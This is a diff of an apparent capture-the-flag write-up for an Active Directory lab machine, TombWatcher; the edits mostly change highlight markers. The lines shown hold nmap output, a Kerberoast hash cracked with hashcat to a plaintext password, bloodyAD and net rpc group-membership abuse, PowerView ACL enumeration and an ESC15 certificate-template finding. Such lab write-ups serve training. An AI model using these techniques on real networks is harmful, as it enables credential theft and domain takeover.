@@ -27,10 +27,10 @@ PORT     STATE SERVICE       VERSION
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 13:50:40Z)
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ==tombwatcher.htb0==., Site: Default-First-Site-Name)
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: !!tombwatcher.htb0!!., Site: Default-First-Site-Name)
 |_ssl-date: 2025-08-23T13:52:01+00:00; +4h00m00s from scanner time.
 | ssl-cert: Subject: commonName=DC01.tombwatcher.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:==DC01.tombwatcher.htb==
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:!!DC01.tombwatcher.htb!!
 | Not valid before: 2024-11-16T00:47:59
 |_Not valid after:  2025-11-16T00:47:59
 445/tcp  open  microsoft-ds?
@@ -63,7 +63,7 @@ Host script results:
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled and required
-|_==clock-skew: mean: 3h59m59s==, deviation: 0s, median: 3h59m59s
+|_!!clock-skew: mean: 3h59m59s!!, deviation: 0s, median: 3h59m59s
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sat Aug 23 11:52:02 2025 -- 1 IP address (1 host up) scanned in 88.86 seconds
@@ -136,7 +136,7 @@ I used `faketime` to avoid getting kerberos clock skew errors. The obtained hash
 ### Cracking the Hash
 ```
 hashcat alfred.hash /usr/share/wordlists/rockyou.txt -m 13100 --show 
-$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f35ca52770e062b38bcd4a2c018f92b3$2cf07d95d960bc0d74a6c8fac2ab55932a4935094222af4729943e96e74077bf366e13b9f02a3c30e61b5d21c39e9765fe25742bc164e7c4ea40ebcf764453f026b960e3ab3690888800df08f29d21efc2d468c169f838103956ef497912a78ab27d8f0f308567918effcfa143d1fccff22ff55278306095b3dc78a33479d8f00b4f6fdcdd0de240faa0b965a107ef932c47abbd58d364fa0b9af617a009e6afe282f93347e89ceb35887d60c9b6853f8f0fa777cf2c867c2c83807bbf94da81bd6473d9be402c8d3447488b65120f7e7f1044829680d352a31a01e77103153a21df08e0c08053744c1edfa99cb58b4b93125b9c715027716d2e4ace5435cad3be9d9ccd3eb35c2c5adc1b92651dc91f445a3afec1ba963c5e19dec648023e76de6f5cc58d3ea5897320cdad71f17d279eaf5b703586036c462ddb1b3a0cd956e982d9fff36debb6d18d890a140b1238d8224f2dc17f72359eb1057bb405e2db0beb498b7217398eb924cfb9e594ce2780eb5e3195c0f0064879834a323a43b8198d13828c0c95c5c22c4ac805b345abe6128234bd17ae4053390ae336fd0a0e7dbd15682bd58c70fd874634f18109d29ebf6155a3a85f8cf17ecd856aee49c2901ec23f24dd74515b98985b256ed30683d17451f362b3b383ea939f2f26c61355c22c0a0efa301d5b83a88af2e56ae3c660191b5e45ed7e5365bb9a5d857ec6263ca7d86c3b80c7e61210fb3a3a7002ef834d7b3216a9d9dd98ee57fd83a574afaab0dffe1abbd2e4f5125d2f8054eaabf54a3cb445fd282e1d94121a87fea87178638303e661ebe9570ded661209124e04f8d704545b7fc08eb25b7f02f6f1b1d34b3f9a5f734c8f3979f66a06b81edceb1cac8f9f6a7466650bf89da925f9f5a40cca7fc609bcf80d88098aed7a73782b1a6a4574d016aa9ad4b7c47291391a821631102211f0edde665c3b1911b32365018b06f73a82ddac76bd369c7ea3b53afe07dbb29f3d9ba270fe561f50f9cd517dc793405a498b6284e5011867aa1d535c7ec37e98d50aad375152bb82bcf80630cd1772484cf4d2f13da41eba985c4eb0b323ef2fd30ea75dc109647d460fd355e640cfa52452c9d1c98ce37763ae949c91ddaa45ac17c7e58de4af0eef9f347883b90fbd9cf795413751ab2e845a160cf369591ae4791f659fc188ef5889eceb77fab620530d219941facba0dc42a33098932100f47cb6cb21a76bba36fad89fb20c1f1dff509baa5e7e47252db2793016a4a67ed4c0d9f2026c985bb599593429a2c4a2189ace8c1ae4696687d60d52f4aa526a482dfe60bd8a6e0c5141b79a107d4831494cff85462fc624ddb0bc347fec084e656d238464023d5b2cedaa8834dac4707f85da7032cfc252ac7974fd2cae2267ec800f1bdc7725eb8809e70467ec67763d36f3a0672775aa15b736c24b287196c8682df783a5650e54d8209f8196:==basketball==
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f35ca52770e062b38bcd4a2c018f92b3$2cf07d95d960bc0d74a6c8fac2ab55932a4935094222af4729943e96e74077bf366e13b9f02a3c30e61b5d21c39e9765fe25742bc164e7c4ea40ebcf764453f026b960e3ab3690888800df08f29d21efc2d468c169f838103956ef497912a78ab27d8f0f308567918effcfa143d1fccff22ff55278306095b3dc78a33479d8f00b4f6fdcdd0de240faa0b965a107ef932c47abbd58d364fa0b9af617a009e6afe282f93347e89ceb35887d60c9b6853f8f0fa777cf2c867c2c83807bbf94da81bd6473d9be402c8d3447488b65120f7e7f1044829680d352a31a01e77103153a21df08e0c08053744c1edfa99cb58b4b93125b9c715027716d2e4ace5435cad3be9d9ccd3eb35c2c5adc1b92651dc91f445a3afec1ba963c5e19dec648023e76de6f5cc58d3ea5897320cdad71f17d279eaf5b703586036c462ddb1b3a0cd956e982d9fff36debb6d18d890a140b1238d8224f2dc17f72359eb1057bb405e2db0beb498b7217398eb924cfb9e594ce2780eb5e3195c0f0064879834a323a43b8198d13828c0c95c5c22c4ac805b345abe6128234bd17ae4053390ae336fd0a0e7dbd15682bd58c70fd874634f18109d29ebf6155a3a85f8cf17ecd856aee49c2901ec23f24dd74515b98985b256ed30683d17451f362b3b383ea939f2f26c61355c22c0a0efa301d5b83a88af2e56ae3c660191b5e45ed7e5365bb9a5d857ec6263ca7d86c3b80c7e61210fb3a3a7002ef834d7b3216a9d9dd98ee57fd83a574afaab0dffe1abbd2e4f5125d2f8054eaabf54a3cb445fd282e1d94121a87fea87178638303e661ebe9570ded661209124e04f8d704545b7fc08eb25b7f02f6f1b1d34b3f9a5f734c8f3979f66a06b81edceb1cac8f9f6a7466650bf89da925f9f5a40cca7fc609bcf80d88098aed7a73782b1a6a4574d016aa9ad4b7c47291391a821631102211f0edde665c3b1911b32365018b06f73a82ddac76bd369c7ea3b53afe07dbb29f3d9ba270fe561f50f9cd517dc793405a498b6284e5011867aa1d535c7ec37e98d50aad375152bb82bcf80630cd1772484cf4d2f13da41eba985c4eb0b323ef2fd30ea75dc109647d460fd355e640cfa52452c9d1c98ce37763ae949c91ddaa45ac17c7e58de4af0eef9f347883b90fbd9cf795413751ab2e845a160cf369591ae4791f659fc188ef5889eceb77fab620530d219941facba0dc42a33098932100f47cb6cb21a76bba36fad89fb20c1f1dff509baa5e7e47252db2793016a4a67ed4c0d9f2026c985bb599593429a2c4a2189ace8c1ae4696687d60d52f4aa526a482dfe60bd8a6e0c5141b79a107d4831494cff85462fc624ddb0bc347fec084e656d238464023d5b2cedaa8834dac4707f85da7032cfc252ac7974fd2cae2267ec800f1bdc7725eb8809e70467ec67763d36f3a0672775aa15b736c24b287196c8682df783a5650e54d8209f8196:!!basketball!!
 ```
 
 We can confirm the newly obtained credential using netexec:
@@ -153,11 +153,11 @@ This can usually be done using `net rpc` but in this case I was getting the foll
 
 ```shell
 net rpc group addmem "infrastructure" "alfred" -U "tombwatcher.htb"/"alfred"%"basketball" -S "10.10.11.72"
-Could not add alfred to infrastructure: NT_STATUS_ACCESS_DENIED
+Could not add alfred to infrastructure: ==NT_STATUS_ACCESS_DENIED==
 ```
 
 ```shell
-bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember  "infrastructure"  alfred
+bloodyAD ==--host== 10.10.11.72 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember  "infrastructure"  alfred
 [+] alfred added to infrastructure
 ```
 
@@ -248,7 +248,7 @@ DACL: WRITE
 ```
 
 It is also important to check that john also has the Reanimate-Tombstones Ace which can be viewed using PowerView:
-```
+```powershell
 *Evil-WinRM* PS C:\Users\john\Documents> import-module ./PowerView.ps1
 *Evil-WinRM* PS C:\Users\john\Documents> $sid = "S-1-5-21-1392491010-1358638721-2126982587-1106"
 *Evil-WinRM* PS C:\Users\john\Documents> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
@@ -257,7 +257,7 @@ It is also important to check that john also has the Reanimate-Tombstones Ace wh
 AceQualifier           : AccessAllowed
 ObjectDN               : DC=tombwatcher,DC=htb
 ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : ==Reanimate-Tombstones==
+ObjectAceType          : !!Reanimate-Tombstones!!
 ObjectSID              : S-1-5-21-1392491010-1358638721-2126982587
 InheritanceFlags       : None
 BinaryLength           : 56
@@ -504,8 +504,8 @@ Certificate Templates
                                           TOMBWATCHER.HTB\Enterprise Admins
                                           TOMBWATCHER.HTB\cert_admin
     [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
-    ==[!] Vulnerabilities==
-      ==ESC15==                             : Enrollee supplies subject and schema version is 1.
+    !![!] Vulnerabilities!!
+      !!ESC15!!                             : Enrollee supplies subject and schema version is 1.
     [*] Remarks
       ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
 ```
